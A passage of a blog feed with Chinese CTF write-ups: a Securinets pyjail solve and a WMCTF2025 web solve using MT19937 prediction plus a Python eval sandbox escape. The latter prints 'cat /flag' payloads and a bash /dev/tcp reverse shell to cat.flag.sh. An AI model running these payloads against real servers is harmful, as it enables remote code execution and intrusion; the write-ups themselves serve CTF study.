title="Easy Jail"></a>Easy Jail</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">seed = random.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">shift_rng = random.Random(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProtectedFlag</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self._value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self._value[index]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example flag</span></span><br><span class="line">flag = ProtectedFlag(<span class="string">&quot;flag&#123;dummy_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_mapping</span>(<span class="params">mapping</span>):</span><br><span class="line">    <span class="comment"># well guess how it was done &gt;_&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_initial_mapping</span>():</span><br><span class="line">    letters = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    shuffled = letters[:]</span><br><span class="line">    random.shuffle(shuffled)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">zip</span>(letters, shuffled))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    valid_chars = <span class="built_in">set</span>(string.ascii_lowercase + <span class="string">&quot;[]()~&gt;&lt;*+&quot;</span>)</span><br><span class="line">    mapping = make_initial_mapping()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the shifting jail! Enter text using only a-z, []()~&gt;&lt;*+&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            user_in = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(user_in) &gt; <span class="number">150</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Input exceeds 150 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(c <span class="keyword">in</span> valid_chars <span class="keyword">for</span> c <span class="keyword">in</span> user_in):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid input. Only [a-z] and []()~&gt;&lt;*+ are allowed.&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            encoded = <span class="string">&quot;&quot;</span>.join(mapping[c] <span class="keyword">if</span> c <span class="keyword">in</span> mapping <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> user_in)</span><br><span class="line"></span><br><span class="line">            mapping = shift_mapping(mapping)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(encoded, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;, &#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(encoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nGoodbye!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>限制我们的输入为<code>a-z []()~&gt;&lt;*+&quot;</code>，下划线、点都无法使用，但是它明确告诉了我们可以通过<strong>下标</strong>读取<code>flag</code></p><p>源码对小写字母做了<strong>映射</strong>，同时还有一个黑盒函数<code>shift_mapping</code>，每输入一次都会被映射<br>先找找字母表有没有<strong>映射规律</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">yvgkwuqnfiodhltjapcbmezsrx</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">yvgkwuqnfiodhltjapcbmezsrx</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">czkoayurjmshlpxnetgfqidwvb</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">czkoayurjmshlpxnetgfqidwvb</span><br><span class="line">dalpbzvskntimqyofuhgrjexwc</span><br><span class="line">ebmqcawtloujnrzpgvihskfyxd</span><br><span class="line">fcnrdbxumpvkosaqhwjitlgzye</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">heptfdzworxmqucsjylkvnibag</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">fcnrdbxumpvkosaqhwjitlgzye</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">heptfdzworxmqucsjylkvnibag</span><br></pre></td></tr></table></figure><p>发现每次都是上一次<code>+1/-1</code>的偏移，那这样就好办了，会有<strong>26个</strong>可能的字母表，<code>&#39;flag&#39;</code>会被映射成<strong>26种</strong>可能</p><p>同时在<code>Python</code>中，可以利用<strong>空元组</strong>构造数字，这里等号用不了，但可以<strong>取反</strong>，通过<code>~(()&gt;())</code>，可以构造出<code>-1</code><br>通过加号连接可以构造出任意负数，再乘<code>-1</code>可以构造任意正数</p><p>因为这里有<code>150</code>的长度限制，所以需要<strong>正向遍历</strong>+<strong>反向遍历</strong>，然后手动剃掉中间重复的字符即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_shift_string</span>(<span class="params">text, shift</span>):</span><br><span class="line">    shifted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        shifted_ord = (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        shifted_text += <span class="built_in">chr</span>(shifted_ord)</span><br><span class="line">    <span class="keyword">return</span> shifted_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_all_shifts</span>(<span class="params">base_alphabet</span>):</span><br><span class="line">    all_shifted_alphabets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        shifted_version = caesar_shift_string(base_alphabet, i)</span><br><span class="line">        all_shifted_alphabets.append(shifted_version)</span><br><span class="line">    <span class="keyword">return</span> all_shifted_alphabets</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&quot;misc-b6c94dd8.p1.securinets.tn&quot;</span>, <span class="number">7000</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;string.ascii_lowercase&#125;</span>&quot;</span>.encode())</span><br><span class="line">conn.recvline()</span><br><span class="line">table = conn.recvline().strip().decode()</span><br><span class="line">tables = generate_all_shifts(table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">    t = <span class="built_in">dict</span>(<span class="built_in">zip</span>(table, string.ascii_lowercase))</span><br><span class="line">    <span class="built_in">map</span> = [<span class="string">&quot;&quot;</span>.join(t[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;flag&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">30</span>):</span><br><span class="line">        index = <span class="string">&quot;[~(()&gt;())*(~(()&gt;())&quot;</span> + <span class="string">&quot;+~(()&gt;())&quot;</span> * i + <span class="string">&quot;)]&quot;</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> count:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(m) + <span class="built_in">len</span>(index) &gt; <span class="number">150</span>:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                conn.sendline(<span class="string">f&quot;<span class="subst">&#123;m&#125;</span><span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">                conn.recvline()</span><br><span class="line">                res = conn.recvline().strip().decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">1</span>:</span><br><span class="line">                    flag += res</span><br><span class="line">                    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag2</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        index = <span class="string">&quot;[~(()&gt;())&quot;</span> + <span class="string">&quot;+~(()&gt;())&quot;</span> * i + <span class="string">&quot;]&quot;</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> count:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(m) + <span class="built_in">len</span>(index) &gt; <span class="number">150</span>:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                conn.sendline(<span class="string">f&quot;<span class="subst">&#123;m&#125;</span><span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">                conn.recvline()</span><br><span class="line">                res = conn.recvline().strip().decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">1</span>:</span><br><span class="line">                    flag += res</span><br><span class="line">                    count = <span class="number">0</span></span><br><span class="line">                    </span><br><span class="line">flag1 = get_flag1()</span><br><span class="line">flag2 = get_flag2()[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Securinets&#123;&#x27;</span> + flag1 + flag2)</span><br><span class="line"><span class="comment"># Securinets&#123;H0p3p3_Y0u_L0ST_1t!&#125;</span></span><br><span class="line"><span class="comment"># Securinets&#123;H0p3_Y0u_L0ST_1t!&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;md7&quot;&gt;&lt;a href=&quot;#md7&quot; class=&quot;headerlink&quot; title=&quot;md7&quot;&gt;&lt;/a&gt;md</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS-Recruit2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/10/01/CNSS-Recruit2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/10/01/CNSS-Recruit2025-Crypto-WriteUp/</id>
    <published>2025-10-01T14:53:10.000Z</published>
    <updated>2025-10-13T19:42:42.904Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ca8dc6c639e9de5bc915d43d58985b321d7647e9652bbbd0a14d61be203ceb80"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Here's something encrypted, password is required to continue reading. It will not be made public until the end of the game.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WMCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/09/21/WMCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/09/21/WMCTF2025-WriteUp/</id>
    <published>2025-09-20T16:18:08.000Z</published>
    <updated>2025-10-02T07:57:24.510Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/80/v2-1ba4c4523935adaa03e61a76ae5cc53b_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-8855f19886aa2a3a58e10d56076c423c_1440w.png" alt=""></p><p>以下题目，<code>*</code>代表赛中未做出来，<code>**</code>代表暂未尝试解题</p><blockquote><p>一些wp<br><a href="https://wx.zsxq.com/group/824215518412/topic/4842452512252428">MNGA</a><br><a href="https://su-team.cn/posts/f7c5eeeb.html">SU</a><br><a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">密码-糖醋小鸡块</a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="guess-79-solved"><a href="#guess-79-solved" class="headerlink" title="guess | 79 solved"></a>guess | 79 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">rd = random.Random()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(rd.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_string()</span><br><span class="line"></span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">a = generate_random_string()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">for</span> user <span class="keyword">in</span> users):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username already exists&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    user_id = generate_random_string()</span><br><span class="line"></span><br><span class="line">    users.append(&#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;User registered successfully&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id</span><br><span class="line">    &#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> users <span class="keyword">if</span> user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">                == username <span class="keyword">and</span> user[<span class="string">&#x27;password&#x27;</span>] == password), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid credentials&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Login successful&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    &#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected_api</span>():</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line"></span><br><span class="line">    key1 = data.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key1:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;key are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    key2 = generate_random_string()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(key1) == <span class="built_in">str</span>(key2):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Not Allowed:&#x27;</span> + <span class="built_in">str</span>(key2) ,</span><br><span class="line">        &#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    payload = data.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="built_in">eval</span>(payload, &#123;<span class="string">&#x27;__builtin__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access granted&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937+PyJail</strong></p><p>看到了熟悉的<code>getrandbits(32)</code>，就知道稳了</p><p>通过<code>/api</code>路由，输入<code>key</code>进行比较判断，同时<strong>猜错了</strong>还会给出题目随机生成的<code>key</code><br>那么只要我们拿到<strong>连续的624</strong>个<code>key</code>，就能拿到一轮完整的<code>state</code>，从而<strong>预测</strong>出后面的随机数，借助<code>randcrack</code>库即可</p><p><code>eval(payload, &#123;&#39;__builtin__&#39;: &#123;&#125;&#125;)</code><br>这里并不是<code>__builtins__</code>，所以没什么限制，非沙箱环境，随便打</p><p>随手复制以前<strong>继承关系</strong>逃逸的<code>payload</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> i.__name__ == <span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里，一直以为是<code>payload</code>的<strong>命令执行</strong>有问题，可能是后台开太多了，我起<code>docker</code>的时候都<strong>没反应</strong>，后面全部关掉，重启电脑，起<code>docker</code>，在<strong>服务端</strong>发现了问题所在</p><p>这里的<strong>回显</strong>并不在客户端，而是在<strong>服务端</strong>，所以我们是看不见输出的<br><img src="https://picx.zhimg.com/80/v2-bd7b49c18653851a32bf1502c1298d64_1440w.png" alt=""><br>原来是没有常见的<code>/var/www/html</code>目录</p><p>然后<strong>写文件</strong>又报错，一看原来是<strong>没权限</strong>，应该是<code>app</code>用户权限太低了，只能读，最后只能通过<strong>反弹shell</strong>拿到<code>flag</code>了，服务器又到期了，只能去白嫖<code>cat.flag.sh</code></p><p>后面看<code>Vidar-Team</code>到的<code>wp</code>，是可以写到<code>/app/static</code>目录下的，是哦把这个静态目录忘了，访问<code>url/static/1.txt</code>即可，好技巧</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://49.232.42.74:30158/api&quot;</span></span><br><span class="line">rc = RandCrack()</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>, desc=<span class="string">&quot;Collecting numbers&quot;</span>):</span><br><span class="line">    res = session.post(url, json=&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;)</span><br><span class="line">    message = res.json().get(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    leaked_key = re.search(<span class="string">r&#x27;\d+&#x27;</span>, message)</span><br><span class="line">    num = <span class="built_in">int</span>(leaked_key.group(<span class="number">0</span>))</span><br><span class="line">    rc.submit(num)</span><br><span class="line"></span><br><span class="line">predicted_key = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;[i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &#x27;_wrap_close&#x27;][0].__init__.__globals__[&#x27;system&#x27;](&quot;/bin/bash -c &#x27;exec&lt;&gt;/dev/tcp/cat.flag.sh/3001;echo&gt;&amp;0 CoCa1Vej;$0 -i&lt;&amp;0&gt;&amp;0 2&gt;&amp;0&#x27;&quot;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = session.post(</span><br><span class="line">    urlL, json=&#123;<span class="string">&#x27;key&#x27;</span>: <span class="built_in">str</span>(predicted_key), <span class="string">&#x27;payload&#x27;</span>: payload&#125;)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload 注入成功!<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="pdf2text-24-solved"><a href="#pdf2text-24-solved" class="headerlink" title="pdf2text* | 24 solved"></a>pdf2text* | 24 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> 